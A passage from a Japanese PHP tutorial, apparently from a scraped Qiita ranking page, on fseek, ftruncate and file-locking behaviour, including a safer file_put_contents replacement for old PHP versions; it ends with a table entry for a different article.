<p><a href="https://camo.qiitausercontent.com/37df3f00cb0ece3535f5c5cee359c36db44666d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66306464323361652d346434342d376332612d333239322d6335316536346137623763322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/37df3f00cb0ece3535f5c5cee359c36db44666d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66306464323361652d346434342d376332612d333239322d6335316536346137623763322e706e67" alt="ss (2013-11-01 at 11.26.03).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/f0dd23ae-4d44-7c2a-3292-c51e64a7b7c2.png"></a></p>

<p>この位置に移動することが出来る。更に</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s1">'f'</span><span class="p">);</span>
</pre></div></div>

<p>として、ここから<ins>1バイト以上</ins>の書き込みを行うと…</p>

<h4>
<span id="一般的なモードでの挙動" class="fragment"></span><a href="#%E4%B8%80%E8%88%AC%E7%9A%84%E3%81%AA%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E6%8C%99%E5%8B%95"><i class="fa fa-link"></i></a>一般的なモードでの挙動</h4>

<p>その位置より左側にある「範囲外の仮NULLバイト」の実体化が起こる。</p>

<p><a href="https://camo.qiitausercontent.com/000236b7efa84ce1713b46225fab669f68683795/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63666433623931312d333237622d303134322d346233662d6331396335663533653264612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/000236b7efa84ce1713b46225fab669f68683795/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63666433623931312d333237622d303134322d346233662d6331396335663533653264612e706e67" alt="ss (2013-11-01 at 11.56.38).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/cfd3b911-327b-0142-4b3f-c19c5f53e2da.png"></a></p>

<h4>
<span id="a-a-モードでの挙動" class="fragment"></span><a href="#a-a-%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E6%8C%99%E5%8B%95"><i class="fa fa-link"></i></a><code>a</code> <code>a+</code> モードでの挙動</h4>

<p>そのまま追記される。</p>

<p><a href="https://camo.qiitausercontent.com/ea28cfbbbdc644959ced3efe01602c7d23d2fd98/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f36653032323365332d663934662d396362322d306630632d3064353633656661373838642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ea28cfbbbdc644959ced3efe01602c7d23d2fd98/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f36653032323365332d663934662d396362322d306630632d3064353633656661373838642e706e67" alt="ss (2013-11-01 at 11.57.15).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/6e0223e3-f94f-9cb2-0f0c-0d563efa788d.png"></a></p>

<h2>
<span id="ftruncate-関数について" class="fragment"></span><a href="#ftruncate-%E9%96%A2%E6%95%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a><strong><a href="http://php.net/manual/ja/function.ftruncate.php" rel="nofollow noopener" target="_blank">ftruncate</a></strong> 関数について</h2>

<p>この関数はファイルポインタを指定したバイト数に丸める関数である。</p>

<h3>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h3>

<ul>
<li>ポインタの位置は<ins>変更されない</ins>。</li>
<li>超過している部分は切り捨てられる。</li>
<li>不足している部分は<ins>実体の</ins>NULLバイトで埋められる。</li>
</ul>

<p><strong><a href="http://php.net/manual/ja/function.ftruncate.php" rel="nofollow noopener" target="_blank">ftruncate</a></strong> 関数コール直後に <strong><a href="http://php.net/manual/ja/function.fwrite.php" rel="nofollow noopener" target="_blank">fwrite</a></strong> 関数をコールしてしまうと、ポインタの位置が変更されていないが故に、そこからの書き込みとなり、当然そこまではNULLバイトで埋められてしまう。下記に例を示す。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'data.txt'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">);</span>
<span class="nb">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
<span class="nb">ftruncate</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s1">'f'</span><span class="p">);</span>
<span class="nb">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></div></div>

<p>としたときに</p>

<p><a href="https://camo.qiitausercontent.com/722ba9f0d9facc9b86653e3ce830988f786c9efe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63663964346565632d393865322d386339382d653331302d3365626235333763633861372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/722ba9f0d9facc9b86653e3ce830988f786c9efe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63663964346565632d393865322d386339382d653331302d3365626235333763633861372e706e67" alt="ss (2013-11-01 at 11.17.54).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/cf9d4eec-98e2-8c98-e310-3ebb537cc8a7.png"></a></p>

<p>がどうなるかを下に示す。</p>

<h4>
<span id="一般的なモードでの挙動-1" class="fragment"></span><a href="#%E4%B8%80%E8%88%AC%E7%9A%84%E3%81%AA%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E6%8C%99%E5%8B%95-1"><i class="fa fa-link"></i></a>一般的なモードでの挙動</h4>

<p><a href="https://camo.qiitausercontent.com/cfb4a000c6bbdeb17f8c9baafe98a57bb3faddd7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64313765353266662d393264382d663238302d326439372d6539336638373231356138382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/cfb4a000c6bbdeb17f8c9baafe98a57bb3faddd7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64313765353266662d393264382d663238302d326439372d6539336638373231356138382e706e67" alt="ss (2013-11-01 at 11.54.16).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/d17e52ff-92d8-f280-2d97-e93f87215a88.png"></a></p>

<p>NULLバイトで先頭が埋められるのを回避したければ、 <strong><a href="http://php.net/manual/ja/function.fwrite.php" rel="nofollow noopener" target="_blank">fwrite</a></strong> 関数のコール直前または直後に <strong><a href="http://php.net/manual/ja/function.rewind.php" rel="nofollow noopener" target="_blank">rewind</a></strong> 関数を実行することにより回避できる。</p>

<h4>
<span id="a-a-モードでの挙動-1" class="fragment"></span><a href="#a-a-%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E6%8C%99%E5%8B%95-1"><i class="fa fa-link"></i></a><code>a</code> <code>a+</code> モードでの挙動</h4>

<p><a href="https://camo.qiitausercontent.com/794f11a7e910f20c7d4f1353a0e7a9bc02759cbe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f33633730346339652d383439392d633265342d313634392d3630633564346138323166372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/794f11a7e910f20c7d4f1353a0e7a9bc02759cbe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f33633730346339652d383439392d633265342d313634392d3630633564346138323166372e706e67" alt="ss (2013-11-01 at 11.46.51).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/3c704c9e-8499-c2e4-1649-60c5d4a821f7.png"></a></p>

<p>最後の <strong><a href="http://php.net/manual/ja/function.fseek.php" rel="nofollow noopener" target="_blank">fseek</a></strong> 関数が先頭の仮NULLバイトを無視していることに注意。</p>

<h2>
<span id="fseek関数の非常にややこしい挙動" class="fragment"></span><a href="#fseek%E9%96%A2%E6%95%B0%E3%81%AE%E9%9D%9E%E5%B8%B8%E3%81%AB%E3%82%84%E3%82%84%E3%81%93%E3%81%97%E3%81%84%E6%8C%99%E5%8B%95"><i class="fa fa-link"></i></a><a href="http://php.net/manual/ja/function.fseek.php" rel="nofollow noopener" target="_blank">fseek</a>関数の非常にややこしい挙動</h2>

<p>最初の表において<a href="http://php.net/manual/ja/function.fseek.php" rel="nofollow noopener" target="_blank">fseek</a>関数は「範囲内の仮NULLバイト」の存在を加味しないとしたが、実際には<ins>現在位置より左側にある「範囲内の仮NULLバイト」の個数分だけ指定値に加算</ins>することで差を打ち消しているとみられる。 <strong><code>SEEK_SET</code></strong> フラグ(デフォルト)のときはこれで最初に述べたような自然な挙動になるが、 <strong><code>SEEK_CUR</code></strong> フラグを指定したときにかなり気持ち悪い結果を引き起こす。具体例を下に挙げる。</p>

<p><a href="https://camo.qiitausercontent.com/5688359cb55fb14ab1c38d3c1a305d6e942b434b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f65323036393036622d396666312d656663622d383238662d3866336132643037336431612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5688359cb55fb14ab1c38d3c1a305d6e942b434b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f65323036393036622d396666312d656663622d383238662d3866336132643037336431612e706e67" alt="ss (2013-11-02 at 12.26.37).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/e206906b-9ff1-efcb-828f-8f3a2d073d1a.png"></a></p>

<p>このとき、</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">SEEK_SET</span><span class="p">);</span> <span class="c1">// 1+2=3</span>
</pre></div></div>

<p>と</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="nx">SEEK_CUR</span><span class="p">);</span> <span class="c1">// -4+2=-2</span>
</pre></div></div>

<p>は、どちらも</p>

<p><a href="https://camo.qiitausercontent.com/70763e8be9cf7010935b86d01871e85bea733a22/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f62366163333938332d306662632d633835382d366264642d3161633734613835306566662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/70763e8be9cf7010935b86d01871e85bea733a22/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f62366163333938332d306662632d633835382d366264642d3161633734613835306566662e706e67" alt="ss (2013-11-02 at 12.35.40).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/b6ac3983-0fbc-c858-6bdd-1ac74a850eff.png"></a></p>

<p>となる。</p>

<h1>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a><strong>その他</strong>
</h1>

<h2>
<span id="テキストモードtとバイナリモードb" class="fragment"></span><a href="#%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89t%E3%81%A8%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%89b"><i class="fa fa-link"></i></a>テキストモード(t)とバイナリモード(b)</h2>

<p>マニュアルより引用。</p>

<p><a href="https://camo.qiitausercontent.com/4b2311cd1045b1245f97399f067255aecd9bfeb0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f34303030396138332d363036392d376138332d633964632d3933336639633962346133392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4b2311cd1045b1245f97399f067255aecd9bfeb0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f34303030396138332d363036392d376138332d633964632d3933336639633962346133392e706e67" alt="ss (2013-10-31 at 06.27.06).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/40009a83-6069-7a83-c9dc-933f9c9b4a39.png"></a></p>

<p>本記事にて <code>r</code> <code>r+</code> などとしてきたが、実際に使うときは <strong><code>rb</code></strong> <strong><code>r+b</code></strong> のようにすべきであろう。</p>

<h2>
<span id="file_get_contents--file_put_contents-の是非" class="fragment"></span><a href="#file_get_contents--file_put_contents-%E3%81%AE%E6%98%AF%E9%9D%9E"><i class="fa fa-link"></i></a><strong><a href="http://php.net/manual/ja/function.file-get-contents.php" rel="nofollow noopener" target="_blank">file_get_contents</a></strong> / <strong><a href="http://php.net/manual/ja/function.file-put-contents.php" rel="nofollow noopener" target="_blank">file_put_contents</a></strong> の是非</h2>

<p>これらは、ファイルの読み出し/書き込みに関わる一連の処理を簡略化することが出来る非常に有用な関数であるが・・・</p>

<p>まず最初に <strong><a href="http://php.net/manual/ja/function.file-put-contents.php" rel="nofollow noopener" target="_blank">file_put_contents</a></strong> 関数について触れる。この関数のマニュアルを見ると</p>

<p><a href="https://camo.qiitausercontent.com/14a53058ef4e8f92799d188af0312c2dcc4706db/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61636132626231642d396632622d343233302d366666652d3163386135663534633535382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/14a53058ef4e8f92799d188af0312c2dcc4706db/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61636132626231642d396632622d343233302d366666652d3163386135663534633535382e706e67" alt="ss (2013-10-31 at 05.01.23).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/aca2bb1d-9f2b-4230-6ffe-1c8a5f54c558.png"></a></p>

<p>第3引数に排他ロックフラグ <strong><code>LOCK_EX</code></strong> を指定できるようであるが、この関数はC言語レベルで実際には下記のような実装になっている。 <strong><a href="http://kannokanno.hatenablog.com/entry/20120624/1340532542" rel="nofollow noopener" target="_blank">「php-5.2.5以前のfile_put_contentsではLOCK_EXによる排他ロックは動かない(5.2.6でFix)」</a></strong> より引用。</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="n">PHP_FUNCTION</span><span class="p">(</span><span class="n">file_put_contents</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// (省略：初期化)</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PHP_FILE_APPEND</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">mode</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'a'</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">LOCK_EX</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* check to make sure we are dealing with a regular file */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">php_memnstr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"://"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="s">"://"</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">filename</span> <span class="o">+</span> <span class="n">filename_len</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">strncasecmp</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"file://"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="s">"file://"</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
                <span class="n">php_error_docref</span><span class="p">(</span><span class="nb">NULL</span> <span class="n">TSRMLS_CC</span><span class="p">,</span> <span class="n">E_WARNING</span><span class="p">,</span> <span class="s">"Exclusive locks may only be set for regular files"</span><span class="p">);</span>
                <span class="n">RETURN_FALSE</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">mode</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'c'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">mode</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="n">stream</span> <span class="o">=</span> <span class="n">php_stream_open_wrapper_ex</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PHP_FILE_USE_INCLUDE_PATH</span><span class="p">)</span> <span class="o">?</span> <span class="nl">USE_PATH</span> <span class="p">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">REPORT_ERRORS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">context</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">stream</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">RETURN_FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">LOCK_EX</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="n">php_stream_supports_lock</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="o">||</span> <span class="n">php_stream_lock</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">LOCK_EX</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">php_stream_close</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
        <span class="n">php_error_docref</span><span class="p">(</span><span class="nb">NULL</span> <span class="n">TSRMLS_CC</span><span class="p">,</span> <span class="n">E_WARNING</span><span class="p">,</span> <span class="s">"Exclusive locks are not supported for this stream"</span><span class="p">);</span>
        <span class="n">RETURN_FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">mode</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'c'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">php_stream_truncate_set_size</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="c1">// (省略：たぶん書き込み処理)</span>
<span class="p">}</span>
</pre></div></div>

<p><strong><code>c</code></strong> モードでオープンを行っているので、ロックが取得できなくてもファイルのデータが失われてしまうことは無い。ところがバージョン5.2.5以前のソースを見ると…</p>

<div class="code-frame" data-lang="c"><div class="highlight"><pre><span></span><span class="n">PHP_FUNCTION</span><span class="p">(</span><span class="n">file_put_contents</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// (省略)</span>
    <span class="n">stream</span> <span class="o">=</span> <span class="n">php_stream_open_wrapper_ex</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PHP_FILE_APPEND</span><span class="p">)</span> <span class="o">?</span> <span class="s">"ab"</span> <span class="o">:</span> <span class="s">"wb"</span><span class="p">,</span> 
            <span class="p">((</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PHP_FILE_USE_INCLUDE_PATH</span><span class="p">)</span> <span class="o">?</span> <span class="nl">USE_PATH</span> <span class="p">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="n">ENFORCE_SAFE_MODE</span> <span class="o">|</span> <span class="n">REPORT_ERRORS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">context</span><span class="p">);</span>
  <span class="c1">// (省略)</span>
<span class="p">}</span>
</pre></div></div>

<p><strong><code>w</code></strong> モードでのオープンを行っているので、<ins>オープンには成功したがロックには失敗した</ins>場合にデータが失われてしまう。もしPHPバージョン5.2.5以下を使う必要があるならば、下記のような関数を実装して使うのが賢明である。 このバージョンでは <strong><code>c</code></strong> モードを使えないため、一見不便に思えるかもしれないが、 <strong><code>a</code></strong> モードで対応することができ、更にこの「仮NULLバイト」の性質を利用すれば <strong><a href="http://php.net/manual/ja/function.rewind.php" rel="nofollow noopener" target="_blank">rewind</a></strong> 関数のコールを省略することさえ出来てしまう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">safe_file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$context</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$args</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="nv">$filename</span><span class="p">,</span>
        <span class="s1">'ab'</span><span class="p">,</span>
        <span class="nv">$flags</span> <span class="o">&amp;</span> <span class="nx">FILE_USE_INCLUDE_PATH</span><span class="p">,</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$args</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$context</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">call_user_func_array</span><span class="p">(</span><span class="s1">'fopen'</span><span class="p">,</span> <span class="nv">$args</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$flags</span> <span class="o">&amp;</span> <span class="nx">LOCK_EX</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_EX</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$flags</span> <span class="o">&amp;</span> <span class="nx">FILE_APPEND</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">ftruncate</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">?</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$data</span><span class="p">);</span>
    <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_UN</span><span class="p">);</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>次に <strong><a href="http://php.net/manual/ja/function.file-get-contents.php" rel="nofollow noopener" target="_blank">file_get_contents</a></strong> 関数について触れるが、この関数はそもそも<ins>ファイルロックをサポートしてない</ins>。書き込み時の <strong>排他ロック(LOCK_EX)</strong> に比べれば 読み込み時の <strong>共有ロック(LOCK_SH)</strong> の重要性は低いかもしれないが、ロックをかけないと読み出し中に他のプロセスによる書き込みが行われた際、想定外の挙動を示す恐れがあるため、 <strong>ユーザーが書き換え可能なデータにアクセスが集中する場合</strong> 、ロックは行っておいた方が無難である。</p>

<p>また、掲示板等のスクリプトで、読み出しと書き込みを順次行う場合について触れる。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>読み出しのみでファイルオープン(失敗したら中止)
↓
共有ロック(失敗したら中止)
↓
読み出し
↓
ロック解除
↓
ファイルクローズ
↓
＜ブランク＞
↓
[ if (.....): ]
↓
書き込みのみでファイルオープン(失敗したら中止)
↓
排他ロック(失敗したら中止)
↓
書き込み
↓
ロック解除
↓
ファイルクローズ
↓
[ endif; ]
</pre></div></div>

<p>ファイルロックをきちんと行っていたとしても、 <strong><code>＜ブランク＞</code></strong> で<ins>他のプロセスに書き込み割り込みされて困る</ins>場合には、ファイルオープン回数を1回にする工夫をしなければならない。下記のように実装するのが理想である。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>読み出し/書き込みでファイルオープン(失敗したら中止)
↓
共有ロック(失敗したら中止)
↓
読み出し
↓
[ if (.....): ]
↓
排他ロックに切り替える(失敗したら中止)
↓
書き込み
↓
[ endif; ]
↓
ロック解除
↓
ファイルクローズ
</pre></div></div>

<h2>
<span id="さまざまなファイル読み出し関数" class="fragment"></span><a href="#%E3%81%95%E3%81%BE%E3%81%96%E3%81%BE%E3%81%AA%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97%E9%96%A2%E6%95%B0"><i class="fa fa-link"></i></a>さまざまなファイル読み出し関数</h2>

<p><a href="https://camo.qiitausercontent.com/d53430263808daac14cd02ab317bcd88421f1399/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f32633333383038312d383336642d393931342d656134342d6431646465313832336239332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d53430263808daac14cd02ab317bcd88421f1399/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f32633333383038312d383336642d393931342d656134342d6431646465313832336239332e706e67" alt="ss (2013-10-31 at 07.00.01).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/2c338081-836d-9914-ea44-d1dde1823b93.png"></a></p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</pre></div></div>

<p>よりは</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">readfile</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</pre></div></div>

<p>の方がパフォーマンスはいい。</p>

<h1>
<span id="関連" class="fragment"></span><a href="#%E9%96%A2%E9%80%A3"><i class="fa fa-link"></i></a>関連</h1>

<h3>
<span id="シリアル版-ページング処理を採り入れた掲示板サンプル" class="fragment"></span><a href="#%E3%82%B7%E3%83%AA%E3%82%A2%E3%83%AB%E7%89%88-%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E5%87%A6%E7%90%86%E3%82%92%E6%8E%A1%E3%82%8A%E5%85%A5%E3%82%8C%E3%81%9F%E6%8E%B2%E7%A4%BA%E6%9D%BF%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB"><i class="fa fa-link"></i></a><a href="http://qiita.com/items/e7f3f60b687053b7832a">[シリアル版] ページング処理を採り入れた掲示板サンプル</a>
</h3>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />37位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>31</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/ae9cf567e5fd9d25e04c">PHPで高機能なTwitterライブラリ作ってみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-02-09 19:36:13</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[Twitter]</b> <b>[TwitterAPI]</b> <b>[streaming]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="twistoauth" class="fragment"></span><a href="#twistoauth"><i class="fa fa-link"></i></a><strong>TwistOAuth</strong>
</h1>

